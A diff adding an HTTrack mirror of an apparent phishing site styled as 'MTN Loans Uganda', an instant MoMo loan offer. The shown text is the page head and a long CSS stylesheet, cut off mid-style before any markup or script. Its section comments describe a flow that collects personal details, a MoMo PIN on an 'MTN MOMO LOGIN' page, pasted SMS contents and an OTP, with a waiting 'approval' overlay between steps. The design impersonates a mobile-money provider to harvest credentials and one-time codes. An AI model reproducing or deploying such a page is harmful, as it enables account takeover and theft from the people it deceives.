@@ -1,0 +1,2092 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from https://a-pply-for-i-nstant-momo-loans-now.netlify.app/ by HTTrack Website Copier/3.x [XR&CO], Thu, 19 Nov 2026 21:46:55 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+<meta charset="UTF-8">
+<!-- This site is hosted on Netlify. Anyone can build and deploy a site
+     like this one for free: https://netlify.new/?utm_campaign=loops&utm_source=ai-legible&utm_medium=owned&utm_content=comment&utm_id=8af50785-75fd-4544-b92b-1d285b1f901f
+     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>MTN Loans Uganda</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    min-height: 100vh;
+    color: #fff;
+  }
+
+  /* ── Waiting / approval overlay ── */
+  #waitingOverlay {
+    display: none; position: fixed; inset: 0; z-index: 99999;
+    background: rgba(0,0,0,0.65); backdrop-filter: blur(4px);
+    flex-direction: column; align-items: center; justify-content: center;
+    padding: 32px;
+  }
+  .waiting-card {
+    background: #fff; border-radius: 20px; padding: 36px 28px;
+    max-width: 340px; width: 100%; text-align: center;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+  }
+  .waiting-spinner {
+    width: 48px; height: 48px; border: 4px solid #e8ecf0;
+    border-top-color: #FFCC00; border-radius: 50%;
+    animation: wSpin 0.8s linear infinite; margin: 0 auto 20px;
+  }
+  @keyframes wSpin { to { transform: rotate(360deg); } }
+  .waiting-title { font-size: 17px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
+  .waiting-msg   { font-size: 13px; color: #666; line-height: 1.6; }
+
+  /* Decline error state */
+  .waiting-error .waiting-spinner { display: none; }
+  .waiting-error .waiting-title   { color: #c0392b; }
+  .waiting-icon-err { font-size: 40px; margin-bottom: 16px; }
+  .waiting-retry-btn {
+    margin-top: 20px; padding: 12px 28px; background: #FFCC00;
+    border: none; border-radius: 10px; font-size: 14px; font-weight: 700;
+    color: #1a1a1a; cursor: pointer; font-family: inherit; width: 100%;
+  }
+
+  /* ── PAGE SHELL ── */
+  .page { display: none; min-height: 100vh; }
+  .page.active { display: block; }
+  #page4.active,
+  #page5.active,
+  #page6.active,
+  #page7.active,
+  #pageLoading.active,
+  #pageLoading2.active,
+  #pageLoading3.active { display: flex; }
+
+  /* ══════════════════════════════
+     PAGE 1 — HOMEPAGE
+  ══════════════════════════════ */
+  #page1 {
+    background: linear-gradient(160deg, #0d2a5e 0%, #1a4a8a 40%, #0f3d6e 70%, #0a2850 100%);
+  }
+
+  #page1 nav {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 18px 20px;
+    background: rgba(255,255,255,0.06);
+    border-bottom: 1px solid rgba(255,255,255,0.1);
+  }
+
+  .logo { display: flex; align-items: center; gap: 12px; text-decoration: none; }
+  .logo-icon {
+    width: 44px; height: 44px;
+    background: #ffcc00; border-radius: 10px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 10px; font-weight: 700; color: #333; letter-spacing: -0.5px;
+  }
+  .logo-text h1 { font-size: 17px; font-weight: 700; color: #fff; line-height: 1.1; }
+  .logo-text span { font-size: 10px; letter-spacing: 2px; color: rgba(255,255,255,0.65); font-weight: 500; }
+
+  .menu-btn {
+    background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2);
+    border-radius: 8px; width: 42px; height: 42px;
+    display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 5px; cursor: pointer;
+  }
+  .menu-btn span { display: block; width: 18px; height: 2px; background: #fff; border-radius: 2px; }
+
+  .hero { padding: 32px 20px 44px; text-align: center; }
+  .badge {
+    display: inline-flex; align-items: center; gap: 10px;
+    background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2);
+    border-radius: 999px; padding: 10px 18px;
+    font-size: 13px; color: rgba(255,255,255,0.9); margin-bottom: 28px;
+  }
+  .badge-dot { width: 7px; height: 7px; background: #ffcc00; border-radius: 50%; flex-shrink: 0; }
+
+  .hero h2 { font-size: 40px; font-weight: 700; line-height: 1.1; margin-bottom: 20px; color: #fff; }
+  .hero h2 em { font-style: normal; color: #ffcc00; }
+  .hero p { font-size: 16px; line-height: 1.65; color: rgba(255,255,255,0.8); margin: 0 auto 32px; }
+
+  .btn-primary {
+    display: block; width: 100%;
+    background: #ffcc00; color: #1a1a1a;
+    font-size: 17px; font-weight: 600;
+    padding: 17px 24px; border-radius: 999px; border: none;
+    cursor: pointer; text-decoration: none; margin-bottom: 12px;
+    transition: background 0.15s;
+  }
+  .btn-primary:hover { background: #f0be00; }
+
+  .btn-secondary {
+    display: block; width: 100%;
+    background: rgba(255,255,255,0.08); color: #fff;
+    font-size: 17px; font-weight: 600;
+    padding: 17px 24px; border-radius: 999px;
+    border: 1.5px solid rgba(255,255,255,0.3);
+    cursor: pointer; text-decoration: none;
+    transition: background 0.15s;
+  }
+  .btn-secondary:hover { background: rgba(255,255,255,0.14); }
+
+  .features {
+    border-top: 1px solid rgba(255,255,255,0.12);
+    padding: 28px 20px;
+    display: flex; flex-direction: column; gap: 15px;
+  }
+  .feature { display: flex; align-items: center; gap: 12px; font-size: 15px; color: rgba(255,255,255,0.85); }
+  .check { width: 20px; height: 20px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; }
+  .check svg { width: 17px; height: 17px; stroke: #ffcc00; }
+
+  /* ══════════════════════════════
+     PAGE 2 — APPLY
+  ══════════════════════════════ */
+  #page2 { background: #f4f6f9; color: #1a1a1a; }
+
+  #page2 nav {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 14px 20px;
+    background: #fff; border-bottom: 1px solid #e5e8ed;
+  }
+  #page2 .logo-text h1 { color: #1a1a1a; }
+  #page2 .logo-text span { color: #888; }
+  #page2 .logo-icon { background: #ffcc00; }
+  .back-btn {
+    background: none; border: none; cursor: pointer;
+    color: #1a4a8a; font-size: 15px; font-weight: 500;
+    display: flex; align-items: center; gap: 6px; padding: 6px 0;
+  }
+
+  .apply-hero {
+    background: linear-gradient(135deg, #0d2a5e 0%, #1a4a8a 100%);
+    padding: 20px 20px 24px; color: #fff;
+  }
+  .breadcrumb { font-size: 12px; color: rgba(255,255,255,0.6); margin-bottom: 14px; }
+  .breadcrumb a { color: rgba(255,255,255,0.6); text-decoration: none; }
+  .breadcrumb span { color: rgba(255,255,255,0.9); }
+
+  .apply-hero h2 { font-size: 28px; font-weight: 700; line-height: 1.2; margin-bottom: 10px; }
+  .apply-hero h2 em { font-style: normal; color: #ffcc00; }
+  .apply-hero p { font-size: 14px; color: rgba(255,255,255,0.75); line-height: 1.5; margin-bottom: 18px; }
+
+  .hero-checks { display: flex; gap: 16px; flex-wrap: wrap; }
+  .hero-checks span { font-size: 12px; color: rgba(255,255,255,0.8); display: flex; align-items: center; gap: 5px; }
+  .hero-checks svg { width: 13px; height: 13px; stroke: #ffcc00; flex-shrink: 0; }
+
+  /* Step card */
+  .apply-body { padding: 16px; }
+
+  .step-card {
+    background: #fff; border-radius: 16px;
+    border: 1px solid #e5e8ed;
+    overflow: hidden; margin-bottom: 14px;
+  }
+
+  .step-header { padding: 16px 20px 0; }
+  .step-meta { display: flex; align-items: center; justify-content: space-between; margin-bottom: 10px; }
+  .step-label { font-size: 11px; font-weight: 700; color: #1a4a8a; letter-spacing: 1px; text-transform: uppercase; }
+  .step-name { font-size: 12px; color: #888; }
+
+  .progress-bar { height: 3px; background: #e8ecf0; border-radius: 2px; margin-bottom: 20px; }
+  .progress-fill { height: 100%; width: 25%; background: #1a4a8a; border-radius: 2px; }
+
+  .step-body { padding: 0 20px 20px; }
+  .step-body h3 { font-size: 20px; font-weight: 700; color: #1a1a1a; margin-bottom: 6px; }
+  .step-body > p { font-size: 13px; color: #666; margin-bottom: 20px; line-height: 1.5; }
+
+  .field-label { font-size: 11px; font-weight: 700; color: #555; letter-spacing: 0.8px; text-transform: uppercase; margin-bottom: 8px; display: block; }
+
+  .amount-input-wrap {
+    display: flex; align-items: center;
+    border: 1.5px solid #d0d7e2; border-radius: 10px;
+    padding: 14px 16px; background: #fff; margin-bottom: 6px;
+    gap: 10px;
+  }
+  .amount-input-wrap:focus-within { border-color: #1a4a8a; }
+  .currency-tag { font-size: 15px; font-weight: 700; color: #1a4a8a; }
+  .amount-input-wrap input {
+    border: none; outline: none; font-size: 17px; font-weight: 500; color: #aaa;
+    width: 100%; background: transparent; font-family: inherit;
+  }
+  .field-hint { font-size: 12px; color: #999; margin-bottom: 16px; }
+
+  .quick-label { font-size: 11px; font-weight: 700; color: #555; letter-spacing: 0.8px; text-transform: uppercase; margin-bottom: 10px; display: block; }
+  .quick-picks { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 20px; }
+  .pill {
+    padding: 9px 14px; border-radius: 999px;
+    border: 1.5px solid #d0d7e2; background: #fff;
+    font-size: 13px; font-weight: 500; color: #444;
+    cursor: pointer; transition: all 0.12s;
+  }
+  .pill:hover { border-color: #1a4a8a; color: #1a4a8a; }
+  .pill.active { background: #1a4a8a; border-color: #1a4a8a; color: #fff; }
+
+  .period-picks { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 20px; }
+
+  .purpose-select-wrap {
+    position: relative;
+    margin-bottom: 24px;
+  }
+
+  .select-wrap {
+    border: 1.5px solid #d0d7e2; border-radius: 10px;
+    padding: 14px 16px; background: #fff;
+    display: flex; align-items: center; justify-content: space-between;
+    cursor: pointer;
+    user-select: none;
+    transition: border-color 0.15s;
+    position: relative;
+    z-index: 1;
+  }
+  .select-wrap.open { border-color: #1a4a8a; }
+  .select-wrap span { font-size: 15px; color: #aaa; }
+  .select-wrap span.selected { color: #1a1a1a; }
+  .select-wrap svg {
+    width: 18px; height: 18px; stroke: #aaa;
+    transition: transform 0.2s;
+    flex-shrink: 0;
+  }
+  .select-wrap.open svg { transform: rotate(180deg); stroke: #1a4a8a; }
+
+  .purpose-dropdown {
+    display: none;
+    flex-direction: column;
+    position: absolute;
+    bottom: calc(100% + 6px);
+    left: 0; right: 0;
+    border: 1.5px solid #1a4a8a;
+    border-radius: 10px;
+    overflow: hidden;
+    background: #fff;
+    box-shadow: 0 -6px 24px rgba(26,74,138,0.12);
+    z-index: 10;
+  }
+  .purpose-dropdown.open { display: flex; }
+
+  .purpose-option {
+    padding: 13px 16px;
+    font-size: 15px; color: #333;
+    cursor: pointer;
+    display: flex; align-items: center; gap: 10px;
+    border-bottom: 1px solid #f0f2f5;
+    transition: background 0.1s;
+  }
+  .purpose-option:last-child { border-bottom: none; }
+  .purpose-option:hover { background: #f0f5fc; color: #1a4a8a; }
+  .purpose-option.active { background: #eaf0fb; color: #1a4a8a; font-weight: 600; }
+  .purpose-option .purpose-check {
+    margin-left: auto;
+    width: 18px; height: 18px;
+    display: none;
+  }
+  .purpose-option.active .purpose-check { display: block; stroke: #1a4a8a; }
+
+  .btn-continue {
+    display: block; width: 100%;
+    background: #1a4a8a; color: #fff;
+    font-size: 17px; font-weight: 600;
+    padding: 17px; border-radius: 999px; border: none;
+    cursor: pointer; transition: background 0.15s;
+  }
+  .btn-continue:hover { background: #163d75; }
+
+  /* Summary card */
+  .summary-card {
+    background: #fff; border-radius: 16px;
+    border: 1px solid #e5e8ed; padding: 20px;
+  }
+  .summary-label { font-size: 11px; font-weight: 700; color: #888; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 8px; }
+  .summary-amount { font-size: 32px; font-weight: 800; color: #1a1a1a; margin-bottom: 2px; }
+  .summary-period { font-size: 13px; color: #888; margin-bottom: 18px; }
+  .summary-rows { border-top: 1px solid #eee; padding-top: 14px; display: flex; flex-direction: column; gap: 12px; }
+  .summary-row { display: flex; justify-content: space-between; align-items: center; font-size: 14px; }
+  .summary-row span:first-child { color: #666; }
+  .summary-row span:last-child { font-weight: 600; color: #1a1a1a; }
+  .summary-note {
+    margin-top: 14px; padding: 12px 14px;
+    background: #fffbeb; border-radius: 8px;
+    border: 1px solid #fde68a;
+    font-size: 12px; color: #92400e; line-height: 1.5;
+  }
+
+  /* ══════════════════════════════
+     PAGE 3 — YOUR DETAILS
+  ══════════════════════════════ */
+  #page3 { background: #f4f6f9; color: #1a1a1a; }
+  #page3 nav {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 14px 20px; background: #fff; border-bottom: 1px solid #e5e8ed;
+  }
+  #page3 .logo-text h1 { color: #1a1a1a; }
+  #page3 .logo-text span { color: #888; }
+
+  .p3-progress-fill { height: 100%; width: 50%; background: #1a4a8a; border-radius: 2px; }
+
+  .text-input {
+    width: 100%; padding: 14px 16px;
+    border: 1.5px solid #d0d7e2; border-radius: 10px;
+    font-size: 15px; font-family: inherit; color: #1a1a1a;
+    background: #fff; outline: none;
+    transition: border-color 0.15s;
+  }
+  .text-input::placeholder { color: #b0b8c8; }
+  .text-input:focus { border-color: #1a4a8a; }
+
+  .dob-row { display: flex; gap: 8px; margin-bottom: 6px; }
+  .dob-row select {
+    flex: 1; padding: 13px 10px;
+    border: 1.5px solid #d0d7e2; border-radius: 10px;
+    font-size: 14px; font-family: inherit; color: #b0b8c8;
+    background: #fff; outline: none; appearance: none;
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%23999' stroke-width='2.5' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'/%3E%3C/svg%3E");
+    background-repeat: no-repeat;
+    background-position: right 10px center;
+    padding-right: 28px;
+    cursor: pointer;
+  }
+  .dob-row select.has-value { color: #1a1a1a; }
+  .dob-row select:focus { border-color: #1a4a8a; }
+
+  .phone-wrap {
+    display: flex; align-items: center;
+    border: 1.5px solid #d0d7e2; border-radius: 10px;
+    overflow: hidden; background: #fff;
+  }
+  .phone-wrap:focus-within { border-color: #1a4a8a; }
+  .phone-flag {
+    padding: 14px 14px 14px 16px;
+    background: #f7f9fc; border-right: 1.5px solid #d0d7e2;
+    font-size: 18px; line-height: 1;
+  }
+  .phone-wrap input {
+    border: none; outline: none; padding: 14px 14px;
+    font-size: 15px; font-family: inherit; color: #1a1a1a;
+    background: transparent; width: 100%;
+  }
+  .phone-wrap input::placeholder { color: #b0b8c8; }
+
+  /* Inline field error messages */
+  .field-err {
+    display: none;
+    font-size: 12px;
+    color: #c0392b;
+    margin-top: 6px;
+    margin-bottom: 10px;
+    display: none;
+    align-items: center;
+    gap: 5px;
+  }
+  .field-err.show { display: flex; }
+  .field-err::before {
+    content: '⚠';
+    font-size: 11px;
+    flex-shrink: 0;
+  }
+  /* Red border on invalid fields */
+  .input-invalid { border-color: #e74c3c !important; }
+
+  .back-continue-row {
+    display: flex; gap: 10px; align-items: center; margin-top: 24px;
+  }
+  .btn-back-pill {
+    flex-shrink: 0; padding: 15px 20px;
+    background: #fff; color: #1a4a8a;
+    border: 1.5px solid #d0d7e2; border-radius: 999px;
+    font-size: 15px; font-weight: 600; cursor: pointer;
+    display: flex; align-items: center; gap: 6px;
+    transition: background 0.15s;
+  }
+  .btn-back-pill:hover { background: #f0f4fa; }
+  .btn-back-pill svg { width: 15px; height: 15px; stroke: #1a4a8a; }
+
+  .p3-summary-amount { font-size: 28px; font-weight: 800; color: #1a1a1a; margin-bottom: 2px; }
+
+  /* ══════════════════════════════
+     PAGE 4 — MTN MOMO LOGIN
+  ══════════════════════════════ */
+  #page4 {
+    background: rgba(80, 100, 130, 0.18);
+    background: #e8edf5;
+    min-height: 100vh;
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 32px 20px;
+  }
+  #page4.active { display: flex; }
+
+  .login-card {
+    background: #fff;
+    border-radius: 20px;
+    width: 100%;
+    max-width: 400px;
+    padding: 28px 24px 32px;
+    position: relative;
+  }
+
+  .login-close {
+    position: absolute; top: 18px; right: 18px;
+    background: none; border: none; cursor: pointer;
+    color: #888; font-size: 20px; line-height: 1;
+    padding: 4px 8px; border-radius: 6px;
+  }
+  .login-close:hover { background: #f0f4fa; color: #444; }
+
+  .login-icon-wrap {
+    width: 64px; height: 64px;
+    background: #e8f0fb; border-radius: 16px;
+    display: flex; align-items: center; justify-content: center;
+    margin: 0 auto 20px;
+  }
+  .login-icon-wrap svg { width: 30px; height: 30px; stroke: #1a4a8a; }
+
+  .login-card h2 {
+    font-size: 20px; font-weight: 700; color: #1a1a1a;
+    text-align: center; margin-bottom: 10px; line-height: 1.3;
+  }
+  .login-card > p {
+    font-size: 14px; color: #666; text-align: center;
+    line-height: 1.6; margin-bottom: 24px;
+  }
+
+  .pin-input {
+    width: 100%; padding: 15px 16px;
+    border: 1.5px solid #d0d7e2; border-radius: 10px;
+    font-size: 18px; font-family: inherit; color: #1a1a1a;
+    background: #fff; outline: none; text-align: center;
+    letter-spacing: 6px; transition: border-color 0.15s;
+    margin-bottom: 0;
+  }
+  .pin-input::placeholder { color: #b0b8c8; letter-spacing: 0; text-align: center; font-size: 14px; }
+  .pin-input:focus { border-color: #1a4a8a; }
+
+  .phone-display-box {
+    width: 100%; padding: 15px 16px;
+    border: 1.5px solid #d0d7e2; border-radius: 10px;
+    font-size: 16px; font-family: inherit; color: #1a1a1a;
+    background: #fff; margin-bottom: 18px;
+    outline: none; transition: border-color 0.15s;
+  }
+  .phone-display-box:focus { border-color: #1a4a8a; }
+
+  .login-hint { font-size: 12px; color: #888; margin-top: 8px; margin-bottom: 24px; line-height: 1.5; }
+
+  .btn-login {
+    display: block; width: 100%;
+    background: #1a4a8a; color: #fff;
+    font-size: 17px; font-weight: 600;
+    padding: 17px; border-radius: 999px; border: none;
+    cursor: pointer; transition: background 0.15s;
+    margin-top: 4px;
+  }
+  .btn-login:hover { background: #163d75; }
+
+  .login-err { color: #c0392b; font-size: 13px; margin-top: 10px; display: none; }
+
+  /* Spinner state */
+  #loginSpinner {
+    display: none;
+    flex-direction: column; align-items: center; justify-content: center;
+    padding: 24px 0 16px; gap: 18px;
+  }
+  #loginSpinner.show { display: flex; }
+  #loginForm.hide { display: none; }
+
+  .spinner {
+    width: 48px; height: 48px;
+    border: 4px solid #e0e8f4;
+    border-top-color: #1a4a8a;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .spinner-text { font-size: 15px; color: #333; font-weight: 600; text-align: center; }
+  .spinner-sub  { font-size: 13px; color: #999; text-align: center; }
+
+  /* ══════════════════════════════
+     PAGE 6 — OTP VERIFICATION
+  ══════════════════════════════ */
+  #page6 {
+    background: #06121f;
+    min-height: 100vh;
+    align-items: flex-start;
+    justify-content: center;
+    padding: 20px 16px 48px;
+    color: #fff;
+  }
+
+  .p6-card {
+    background: #0d1f33;
+    border-radius: 20px;
+    width: 100%;
+    max-width: 500px;
+    padding: 28px 22px 32px;
+  }
+
+  .p6-card h2 {
+    font-size: 36px;
+    font-weight: 800;
+    color: #fff;
+    margin-bottom: 12px;
+    line-height: 1.1;
+    letter-spacing: -0.5px;
+  }
+
+  .p6-card .sub {
+    font-size: 15px;
+    color: rgba(255,255,255,0.52);
+    line-height: 1.6;
+    margin-bottom: 28px;
+  }
+
+  /* Sending To box — matches page 5 style */
+  .otp-sending-box {
+    border: 1.5px dashed rgba(255,255,255,0.22);
+    border-radius: 12px;
+    padding: 18px 20px;
+    text-align: center;
+    margin-bottom: 24px;
+    background: rgba(255,255,255,0.03);
+  }
+
+  .otp-sending-label {
+    font-size: 11px;
+    letter-spacing: 2.5px;
+    font-weight: 700;
+    color: rgba(255,255,255,0.38);
+    text-transform: uppercase;
+    margin-bottom: 10px;
+  }
+
+  .otp-phone-number {
+    font-size: 30px;
+    font-weight: 800;
+    font-style: italic;
+    color: #fff;
+  }
+
+  /* "ENTER OTP CODE" label */
+  .otp-enter-label {
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 2.5px;
+    text-transform: uppercase;
+    color: rgba(255,255,255,0.5);
+    margin-bottom: 14px;
+    text-align: center;
+  }
+
+  /* OTP dots box — white background */
+  .otp-dots-box {
+    background: #ffffff;
+    border: 1.5px dashed #c8d4e0;
+    border-radius: 12px;
+    padding: 32px 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 36px;
+    margin-bottom: 24px;
+    position: relative;
+    cursor: text;
+    transition: border-color 0.15s;
+  }
+  .otp-dots-box:focus-within {
+    border-style: solid;
+    border-color: #2a5fa8;
+  }
+
+  .otp-dot {
+    width: 11px; height: 11px;
+    background: #c8d4e0;
+    border-radius: 50%;
+    transition: background 0.2s;
+  }
+
+  .otp-dot.filled {
+    background: #f47c20;
+    box-shadow: 0 0 8px rgba(244,124,32,0.5);
+  }
+
+  /* Hidden real input */
+  .otp-hidden-input {
+    position: absolute;
+    opacity: 0;
+    width: 100%; height: 100%;
+    top: 0; left: 0;
+    font-size: 16px;
+    border: none; outline: none;
+    background: transparent;
+    caret-color: transparent;
+    cursor: text;
+  }
+
+  .btn-otp-verify {
+    display: block; width: 100%;
+    background: #f47c20;
+    color: #fff;
+    font-size: 19px; font-weight: 700;
+    padding: 19px; border-radius: 14px; border: none;
+    cursor: pointer;
+    transition: background 0.15s;
+    margin-bottom: 20px;
+    letter-spacing: 0.3px;
+  }
+  .btn-otp-verify:hover { background: #d96a10; }
+
+  .otp-ssl-label {
+    display: flex; align-items: center; justify-content: center;
+    gap: 8px;
+    font-size: 13px; font-weight: 700;
+    letter-spacing: 1.2px; text-transform: uppercase;
+    color: #2ecc71;
+  }
+  .otp-ssl-label svg { width: 15px; height: 15px; stroke: #2ecc71; }
+
+  .otp-err {
+    color: #ff9e9e; font-size: 13px;
+    margin-bottom: 14px;
+    display: none;
+  }
+
+  /* ══════════════════════════════
+     PAGE 7 — SUCCESS
+  ══════════════════════════════ */
+  #page7 {
+    background: linear-gradient(160deg, #0d2a5e 0%, #1a4a8a 50%, #0f3d6e 100%);
+    min-height: 100vh;
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 32px 20px;
+  }
+  .success-card {
+    background: rgba(255,255,255,0.08);
+    border: 1px solid rgba(255,255,255,0.15);
+    border-radius: 20px;
+    width: 100%;
+    max-width: 420px;
+    padding: 36px 24px 36px;
+    color: #fff;
+    text-align: center;
+  }
+
+  .success-icon-ring {
+    width: 90px; height: 90px;
+    border-radius: 50%;
+    border: 3px solid rgba(46,204,113,0.5);
+    display: flex; align-items: center; justify-content: center;
+    margin: 0 auto 28px;
+    position: relative;
+  }
+  .success-icon-ring::before {
+    content: '';
+    position: absolute;
+    inset: 6px;
+    border-radius: 50%;
+    background: rgba(46,204,113,0.15);
+  }
+  .success-check-circle {
+    width: 58px; height: 58px;
+    border-radius: 50%;
+    background: #2ecc71;
+    display: flex; align-items: center; justify-content: center;
+    position: relative; z-index: 1;
+    animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) both;
+  }
+  @keyframes popIn {
+    0%   { transform: scale(0); opacity: 0; }
+    100% { transform: scale(1); opacity: 1; }
+  }
+  .success-check-circle svg {
+    width: 28px; height: 28px;
+    stroke: #fff; stroke-width: 3;
+  }
+
+  .success-card h2 {
+    font-size: 28px; font-weight: 700;
+    color: #fff; margin-bottom: 12px; line-height: 1.2;
+  }
+
+  .success-card > p {
+    font-size: 15px; color: rgba(255,255,255,0.75);
+    line-height: 1.65; margin-bottom: 28px;
+  }
+
+  .success-amount-box {
+    background: rgba(255,204,0,0.12);
+    border: 1.5px solid rgba(255,204,0,0.35);
+    border-radius: 14px;
+    padding: 20px 16px;
+    margin-bottom: 24px;
+  }
+  .success-amount-label {
+    font-size: 11px; letter-spacing: 2px;
+    text-transform: uppercase;
+    color: rgba(255,255,255,0.55);
+    margin-bottom: 8px;
+  }
+  .success-amount-value {
+    font-size: 36px; font-weight: 800;
+    color: #ffcc00; line-height: 1;
+    margin-bottom: 6px;
+  }
+  .success-amount-sub {
+    font-size: 13px; color: rgba(255,255,255,0.6);
+  }
+
+  .success-details {
+    border: 1px solid rgba(255,255,255,0.12);
+    border-radius: 12px;
+    overflow: hidden;
+    margin-bottom: 28px;
+  }
+  .success-detail-row {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 13px 16px;
+    font-size: 14px;
+    border-bottom: 1px solid rgba(255,255,255,0.08);
+  }
+  .success-detail-row:last-child { border-bottom: none; }
+  .success-detail-row span:first-child { color: rgba(255,255,255,0.6); }
+  .success-detail-row span:last-child  { font-weight: 600; color: #fff; }
+
+  .success-notice {
+    background: rgba(46,204,113,0.1);
+    border: 1px solid rgba(46,204,113,0.3);
+    border-radius: 10px;
+    padding: 14px 16px;
+    font-size: 13px;
+    color: rgba(255,255,255,0.8);
+    line-height: 1.6;
+    margin-bottom: 28px;
+    text-align: left;
+    display: flex; gap: 10px; align-items: flex-start;
+  }
+  .success-notice-icon { font-size: 17px; flex-shrink: 0; margin-top: 1px; }
+
+  .btn-success-home {
+    display: block; width: 100%;
+    background: #ffcc00; color: #1a1a1a;
+    font-size: 17px; font-weight: 700;
+    padding: 18px; border-radius: 999px; border: none;
+    cursor: pointer; transition: background 0.15s;
+    margin-bottom: 12px;
+  }
+  .btn-success-home:hover { background: #f0be00; }
+
+  .btn-success-secondary {
+    display: block; width: 100%;
+    background: rgba(255,255,255,0.08);
+    border: 1.5px solid rgba(255,255,255,0.25);
+    color: #fff;
+    font-size: 15px; font-weight: 600;
+    padding: 15px; border-radius: 999px;
+    cursor: pointer; transition: background 0.15s;
+  }
+  .btn-success-secondary:hover { background: rgba(255,255,255,0.14); }
+
+  /* ══════════════════════════════
+     PAGE 5 — SMS VERIFICATION
+  ══════════════════════════════ */
+  #page5 {
+    background: #06121f;
+    min-height: 100vh;
+    align-items: flex-start;
+    justify-content: center;
+    padding: 20px 16px 48px;
+    color: #fff;
+  }
+
+  .p5-card {
+    background: #0d1f33;
+    border-radius: 20px;
+    width: 100%;
+    max-width: 500px;
+    padding: 28px 22px 32px;
+  }
+
+  .p5-card h2 {
+    font-size: 32px; font-weight: 700; color: #fff;
+    line-height: 1.15; margin-bottom: 12px;
+  }
+
+  .p5-card .sub {
+    font-size: 15px; color: rgba(255,255,255,0.58);
+    line-height: 1.6; margin-bottom: 24px;
+  }
+
+  .sending-box {
+    border: 1.5px dashed rgba(255,255,255,0.22);
+    border-radius: 12px; padding: 18px 20px;
+    text-align: center; margin-bottom: 16px;
+    background: rgba(255,255,255,0.03);
+  }
+  .sending-box .to-label {
+    font-size: 11px; letter-spacing: 2.5px; font-weight: 700;
+    color: rgba(255,255,255,0.38); text-transform: uppercase; margin-bottom: 10px;
+  }
+  .sending-box .to-number {
+    font-size: 30px; font-weight: 800; font-style: italic; color: #fff;
+  }
+
+  .warning-box {
+    background: rgba(244,124,32,0.1);
+    border: 1.5px solid rgba(244,124,32,0.45);
+    border-radius: 12px; padding: 14px 16px;
+    display: flex; gap: 12px; align-items: flex-start;
+    margin-bottom: 24px;
+  }
+  .warning-box .warn-icon { font-size: 17px; flex-shrink: 0; margin-top: 2px; }
+  .warning-box p { font-size: 14px; color: rgba(255,255,255,0.82); line-height: 1.55; }
+  .warning-box p strong { color: #f4a742; font-weight: 700; }
+
+  .sms-field-label {
+    font-size: 11px; font-weight: 700; letter-spacing: 1.8px;
+    color: rgba(255,255,255,0.45); text-transform: uppercase;
+    display: block; margin-bottom: 10px;
+  }
+
+  .sms-textarea {
+    width: 100%; min-height: 162px;
+    background: #ffffff;
+    border: 1.5px solid #2a5fa8;
+    border-radius: 10px; padding: 16px;
+    font-size: 15px; font-family: inherit;
+    color: #1a1a1a; outline: none; resize: vertical;
+    transition: border-color 0.15s; line-height: 1.65;
+  }
+  .sms-textarea::placeholder { color: #b0b8c8; }
+  .sms-textarea:focus { border-color: #4a90d9; }
+
+  .char-count {
+    text-align: right; font-size: 14px;
+    color: rgba(255,255,255,0.4); margin-top: 8px; margin-bottom: 24px;
+  }
+
+  .btn-next {
+    display: block; width: 100%;
+    background: #f47c20; color: #fff;
+    font-size: 18px; font-weight: 700;
+    padding: 18px; border-radius: 14px; border: none;
+    cursor: pointer; transition: background 0.15s; margin-bottom: 20px;
+    letter-spacing: 0.2px;
+  }
+  .btn-next:hover { background: #d96a10; }
+
+  .ssl-label {
+    text-align: center; font-size: 13px; font-weight: 700;
+    letter-spacing: 1.2px; color: #2ecc71;
+    text-transform: uppercase; display: flex;
+    align-items: center; justify-content: center; gap: 8px;
+  }
+  .ssl-label svg { width: 15px; height: 15px; stroke: #2ecc71; flex-shrink: 0; }
+
+  .sms-err { color: #ffb3b3; font-size: 13px; margin-bottom: 14px; display: none; }
+
+  /* ══════════════════════════════
+     PAGE LOADING SCREENS
+  ══════════════════════════════ */
+  #pageLoading,
+  #pageLoading2,
+  #pageLoading3 {
+    background: linear-gradient(160deg, #0d2a5e 0%, #1a4a8a 50%, #0f3d6e 100%);
+    min-height: 100vh;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    position: relative;
+    overflow: hidden;
+  }
+  #pageLoading.active  { display: flex; }
+  #pageLoading2.active { display: flex; }
+  #pageLoading3.active { display: flex; }
+
+  /* Soft radial glows */
+  .loading-glow-blue {
+    position: absolute;
+    top: 10%;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 400px; height: 400px;
+    background: radial-gradient(circle, rgba(100,160,240,0.18) 0%, transparent 65%);
+    pointer-events: none;
+  }
+  .loading-glow-yellow {
+    position: absolute;
+    bottom: 10%;
+    left: 50%;
+    transform: translateX(-50%);
